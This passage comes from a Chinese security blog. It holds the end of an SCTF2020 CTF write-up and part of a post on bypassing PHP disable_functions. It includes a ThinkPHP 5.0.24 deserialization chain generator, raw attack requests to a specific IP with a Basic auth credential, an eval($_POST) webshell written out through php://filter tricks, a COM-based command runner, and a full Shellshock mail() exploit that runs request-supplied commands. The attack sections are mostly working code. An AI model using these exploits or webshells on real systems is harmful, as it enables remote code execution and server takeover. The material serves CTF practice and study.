class="literal">false</span>,</span><br><span class="line">	    <span class="string">&#x27;prefix&#x27;</span>        =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">		<span class="string">&#x27;path&#x27;</span> =&gt; <span class="string">&#x27;php://filter/write=convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&#x27;</span>, <span class="comment">// 因为 static 目录有写权限</span></span><br><span class="line">	    <span class="string">&#x27;data_compress&#x27;</span> =&gt; <span class="literal">false</span></span><br><span class="line">	];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">cache</span>\<span class="title">driver</span>\<span class="title">File</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Memcached</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$handler</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;handler=<span class="keyword">new</span> File();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">console</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">session</span>\<span class="title">driver</span>\<span class="title">Memcached</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Output</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$styles</span> = [];</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$handle</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;styles = [<span class="string">&quot;getAttr&quot;</span>, <span class="string">&#x27;info&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;error&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;comment&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;question&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;highlight&#x27;</span>,</span><br><span class="line">			 <span class="string">&#x27;warning&#x27;</span>];</span><br><span class="line">	<span class="keyword">$this</span>-&gt;handle = <span class="keyword">new</span> Memcached();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;model = <span class="keyword">new</span> Output();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">db</span>\<span class="title">Query</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HasOne</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$model</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$parent</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$query</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;query = <span class="keyword">new</span> Query(<span class="string">&quot;xx&quot;</span>, <span class="string">&#x27;think\console\Output&#x27;</span>);</span><br><span class="line">	<span class="keyword">$this</span>-&gt;model = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;selfRelation = <span class="literal">false</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;bindAttr = [<span class="string">&quot;xx&quot;</span> =&gt; <span class="string">&quot;xx&quot;</span>];</span><br><span class="line">    &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">model</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">console</span>\<span class="title">Output</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">relation</span>\<span class="title">HasOne</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pivot</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$parent</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$data</span> = [];</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$model</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;parent = <span class="keyword">new</span> Output();</span><br><span class="line">	<span class="keyword">$this</span>-&gt;error = <span class="keyword">new</span> HasOne();</span><br><span class="line">	<span class="keyword">$this</span>-&gt;model = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;append = [<span class="string">&quot;test&quot;</span> =&gt; <span class="string">&quot;getError&quot;</span>];</span><br><span class="line">	<span class="keyword">$this</span>-&gt;data = [<span class="string">&quot;panrent&quot;</span> =&gt; <span class="string">&quot;true&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">process</span>\<span class="title">pipes</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">model</span>\<span class="title">Pivot</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Windows</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span> = [];</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">$this</span>-&gt;files=[<span class="keyword">new</span> Pivot()];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> Windows();</span><br><span class="line"><span class="variable">$payload</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure>

<p>写文件到/tmp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">payload=requests.get(<span class="string">&quot;http://127.0.0.1/cms/thinkphp/5.0.24/tp5/public/test.php&quot;</span>).text.strip()</span><br><span class="line">burp0_url = <span class="string">&quot;http://8.208.102.48:80/public/index.php&quot;</span></span><br><span class="line">params=&#123;</span><br><span class="line">    <span class="string">&quot;s&quot;</span>:<span class="string">&quot;/index/Index/hello&quot;</span>,</span><br><span class="line">    <span class="string">&quot;s3cr3tk3y&quot;</span>:payload</span><br><span class="line">&#125;</span><br><span class="line">burp0_headers = &#123;<span class="string">&quot;Authorization&quot;</span>: <span class="string">&quot;Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">res=requests.get(burp0_url, headers=burp0_headers ,params=params)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br><span class="line"><span class="built_in">print</span>(requests.get(<span class="string">&quot;http://8.208.102.48:80/public/log.txt&quot;</span>).text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /public/nationalsb/login.php HTTP/1.1</span><br><span class="line">Host: 8.208.102.48</span><br><span class="line">Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 155</span><br><span class="line"></span><br><span class="line">file=php://filter/read=convert.base64-encode/resource=/tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b743f45ea3d60a1190e3f723595050ca2.php&amp;1=phpinfo();&amp;1=phpinfo();</span><br></pre></td></tr></table></figure>

<p>写到文件里的内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//000000000000</span><br><span class="line"> exit();?&gt;</span><br><span class="line">s:163:&quot;php://filter/write=convert.base64-encode/resource=../../../../../../../../../../../../../../../../tmp/filenamebfe3467e649d6d158c51b5b5494ca5a2.php&quot;;</span><br></pre></td></tr></table></figure>
<p>这里 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> 里面的方法已经不管用了，我们需要自己想出其他办法</p>
<p>这里我们用<code>php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=</code>来绕过死亡exit</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$backdoor</span> = <span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$x</span> = str_rot13(base64_encode(<span class="variable">$payload</span>));</span><br><span class="line"><span class="variable">$payload</span> = base64_decode(str_rot13(base64_encode(<span class="variable">$backdoor</span>)));</span><br><span class="line">assert(base64_decode(<span class="variable">$x</span>) === <span class="variable">$backdoor</span>);</span><br></pre></td></tr></table></figure>

<p><code>$dieORexit --convert.base64-encode|string.rot13|convert.base64-decode--&gt; something else</code></p>
<p><code>$payload   --convert.base64-encode|string.rot13|convert.base64-decode--&gt; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;</code> </p>
<p>最后的payload:<br><code>&#39;path&#39; =&gt; &#39;php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/t&#39;.urldecode(&quot;%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E&quot;)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /public/nationalsb/login.php HTTP/1.1</span><br><span class="line">Host: 8.208.102.48</span><br><span class="line">Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 126</span><br><span class="line"></span><br><span class="line">file=%2ftmp%2ft%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E743f45ea3d60a1190e3f723595050ca2.php&amp;1=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/07/07/sctf2020/" data-id="cku8ky2z80062dnnfbx2j1niv" data-title="sctf2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-bypass_disable_function_open_basedir" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/06/29/bypass_disable_function_open_basedir/" class="article-date">
  <time class="dt-published" datetime="2020-06-29T16:00:00.000Z" itemprop="datePublished">2020-06-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/06/29/bypass_disable_function_open_basedir/">bypass_disable_function_open_basedir</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h1><h2 id="危险函数-类"><a href="#危险函数-类" class="headerlink" title="危险函数/类"></a>危险函数/类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FFI</span><br><span class="line">COM</span><br><span class="line">exec</span><br><span class="line">assert</span><br><span class="line">eval</span><br><span class="line">system</span><br><span class="line">ini_set/ini_alter</span><br><span class="line">putenv</span><br><span class="line">imap_open</span><br><span class="line">pcntl_exec</span><br><span class="line">win_shell_execute</span><br><span class="line">dl</span><br></pre></td></tr></table></figure>



<h2 id="利用Windows系统组件COM绕过"><a href="#利用Windows系统组件COM绕过" class="headerlink" title="利用Windows系统组件COM绕过"></a>利用Windows系统组件COM绕过</h2><p>利用条件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">extension=php_com_dotnet.dll</span><br><span class="line">com.allow_dcom = true</span><br><span class="line">wshom.ocx 存在</span><br></pre></td></tr></table></figure>



<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$command</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line"><span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;exec(<span class="string">&quot;cmd /c&quot;</span>.<span class="variable">$command</span>); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line"><span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;StdOut();</span><br><span class="line"><span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br></pre></td></tr></table></figure>





<h2 id="GNU-Bash-环境变量远程命令执行漏洞-CVE-2014-6271"><a href="#GNU-Bash-环境变量远程命令执行漏洞-CVE-2014-6271" class="headerlink" title="GNU Bash 环境变量远程命令执行漏洞 CVE-2014-6271"></a>GNU Bash 环境变量远程命令执行漏洞 CVE-2014-6271</h2><blockquote>
<p>   被攻击的bash存在漏洞（版本小于等于4.3）<br>   攻击者可以控制环境变量<br>   新的bash进程被打开触发漏洞并执行命令</p>
</blockquote>
<p>利用php的mail函数:<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/35146">https://www.exploit-db.com/exploits/35146</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.antiy.com/response/CVE-2014-6271.html">https://www.antiy.com/response/CVE-2014-6271.html</a></p>
<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><p>4.3及之前的bash启动解析环境变量时未对边界进行严格的限制</p>
<p>“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。核心的原因在于在输入的过滤中没有严格限制边界，没有做合法化的参数判断。</p>
<p>bash函数的格式,调用函数只需变量名+参数即可<code>函数 参数1 参数2</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">funtion ShellShock </span><br><span class="line">&#123; <span class="built_in">echo</span> <span class="string">&quot;Injection&quot;</span>&#125; ShellShock   <span class="comment">#调用这个函数</span></span><br></pre></td></tr></table></figure>

<p>这个时候的Bash的环境变量：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">KEY = ShellShockVALUE = () &#123; echo Injection; &#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>来看看ShellShock漏洞的真身：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export ShellShock=&#x27;() &#123; :; &#125;; echo;/usr/bin/whoami&#x27;</span><br><span class="line"><span class="meta">bash&gt;</span><span class="bash">Kr0iN</span></span><br></pre></td></tr></table></figure>

<p>看看环境变量你有什么<br><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1229"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env x=<span class="string">&#x27;() &#123; :;&#125;; echo Vulnerable CVE-2014-6271 &#x27;</span> bash -c <span class="string">&quot;echo test&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1379"></p>
<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="php的mail函数"><a href="#php的mail函数" class="headerlink" title="php的mail函数()"></a>php的mail函数()</h4><p>如果服务器的默认sh是bash,mail函数会生成一个bash进程,再结合putenv()利用破壳漏洞来实现任意命令执行</p>
<p>会生成bash进程除了mail,php函数还有imap_mail，如果你仅仅通过禁用mail函数来规避这个安全问题，那么imap_mail是可以做替代的。当然，php里还可能有其他地方有调用popen或其他能够派生bash子进程的函数，通过这些地方，都可以通过破壳漏洞执行命令的。</p>
<p>更详细的解释:p牛的<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html">PHP Execute Command Bypass Disable_functions</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)</span></span><br><span class="line"><span class="comment"># Google Dork: none</span></span><br><span class="line"><span class="comment"># Date: 10/31/2014</span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall)</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net</span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror</span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2)</span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6</span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271</span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Disabled functions: &quot;</span>.ini_get(<span class="string">&#x27;disable_functions&#x27;</span>).<span class="string">&quot;\n&quot;</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @ mail.c:283</span></span><br><span class="line">   <span class="keyword">if</span>(strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;</span><br><span class="line">     <span class="variable">$tmp</span> = tempnam(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;data&quot;</span>);</span><br><span class="line">     putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$cmd</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);</span><br><span class="line">     <span class="comment">// In Safe Mode, the user may only alter environment variables whose names</span></span><br><span class="line">     <span class="comment">// begin with the prefixes supplied by this directive.</span></span><br><span class="line">     <span class="comment">// By default, users will only be able to set environment variables that</span></span><br><span class="line">     <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive is empty,</span></span><br><span class="line">     <span class="comment">// PHP will let the user modify ANY environment variable!</span></span><br><span class="line">     mail(<span class="string">&quot;a@127.0.0.1&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;-bv&quot;</span>); <span class="comment">// -bv so we don&#x27;t actually send any mail</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;Not vuln (not bash)&quot;</span>;</span><br><span class="line">   <span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);</span><br><span class="line">   @unlink(<span class="variable">$tmp</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">&quot;No output, or not vuln.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> shellshock(<span class="variable">$_REQUEST</span>[<span class="string">&quot;cmd&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="利用php-fpm未授权访问漏洞"><a href="#利用php-fpm未授权访问漏洞" class="headerlink" title="利用php-fpm未授权访问漏洞"></a>利用php-fpm未授权访问漏洞</h2><h3 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h3><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5598">浅析php-fpm的攻击方式</a></p>
<h3 id="什么是php-fpm"><a href="#什么是php-fpm" class="headerlink" title="什么是php-fpm"></a>什么是php-fpm</h3><p>php-fpm是php官方的fastcgi解析器,Nginx等服务器中间件将用户请求按照fastcgi的规则打包好通过TCP传给谁？其实就是传给FPM。FPM按照fastcgi的协议将TCP流解析成真正的数据。</p>
<p>说到fastcgi,就必须先讲一下cgi</p>
<p>cgi的历史:</p>
<blockquote>
<p>早期的webserver只处理html等静态文件，但是随着技术的发展，出现了像php等动态语言。<br>webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！<br>交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？<br>为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序。</p>
</blockquote>
<p>Fast-CGI:</p>
<p>虽然cgi解决php解释器与webserver的通信问题，但是webserver每收到一个请求就会去fork一个cgi进程,请求结束再kill掉这个进程,这样会很浪费资源,于是出现了cgi的改良版本。</p>
<blockquote>
<p>fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，大大提高了效率。</p>
</blockquote>
<p>php-fpm 是一个Fastcgi的实现,并提供进程管理功能。</p>
<p>进程包含了master进程和worker进程</p>
<p>master进程只有一个,负责监听端口(一般是9000)接收来自Web Server的请求,而worker进程则一般有多个(具体数量根据实际需要配置),每个进程内部都嵌入了一个php解释器,是php代码真正执行的地方。</p>
<p>[<img src="https://xzfile.aliyuncs.com/media/upload/picture/20190709100809-65db4fc6-a1ee-1.jpg" alt="image4092"></p>
<p>上面第一个是主进程,下面两个是worker进程。</p>
<h3 id="服务器利用fastcgi的通信过程"><a href="#服务器利用fastcgi的通信过程" class="headerlink" title="服务器利用fastcgi的通信过程"></a>服务器利用fastcgi的通信过程</h3><p>Fastcgi其实是一个通信协议，和HTTP协议一样，都是进行数据交换的一个通道。</p>
<p>fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。</p>
<p>类比HTTP协议来说，fastcgi协议则是服务器中间件和某个语言后端进行数据交换的协议。Fastcgi协议由多个record组成，record也有header和body一说，服务器中间件将这二者按照fastcgi的规则封装好发送给语言后端，语言后端解码以后拿到具体数据，进行指定操作，并将结果再按照该协议封装好后返回给服务器中间件。</p>
<p>record具有固定的结构。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="comment">/* Header */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> version; <span class="comment">// 版本</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> type; <span class="comment">// 本次record的类型</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> requestIdB1; <span class="comment">// 本次record对应的请求id</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> 